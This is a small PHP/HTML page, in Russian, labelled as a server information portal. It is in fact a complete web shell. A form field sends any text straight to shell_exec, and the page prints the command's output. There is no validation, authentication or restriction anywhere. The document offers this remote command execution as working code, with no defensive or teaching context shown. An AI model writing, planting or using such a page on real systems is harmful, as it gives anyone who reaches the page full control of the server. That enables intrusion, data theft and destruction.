<html lang="en">
<head>
<title>Команды</title>
    <link rel="stylesheet" href="style.css" type="text/css"/>
</head>
<body>
<h1>Информационный порталъ сервера</h1>

<form action="" method="post">
    <label for="command">Введите команду:</label><br>
    <input type="text" id="command" name="command" size="50"><br>
    <button type="submit">Выполнить</button>
</form>
<?php
class CommandExecutor {
    private $command;

    public function __construct($command) {
        $this->command = $command;
    }

    public function execute() {
        // Выполняем команду и возвращаем результат
        return shell_exec($this->command);
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Получаем команду из POST-запроса
    $command = $_POST['command'];

    // Создаем экземпляр класса CommandExecutor
    $executor = new CommandExecutor($command);

    // Выполняем команду и получаем результат
    $result = $executor->execute();

    // Выводим результат
    echo "<p>Результат выполнения команды: <strong>" . htmlspecialchars($command) . "</strong></p>";
    echo "<pre>" . htmlspecialchars($result) . "</pre>";
}
?>
</table>
</body>
</html>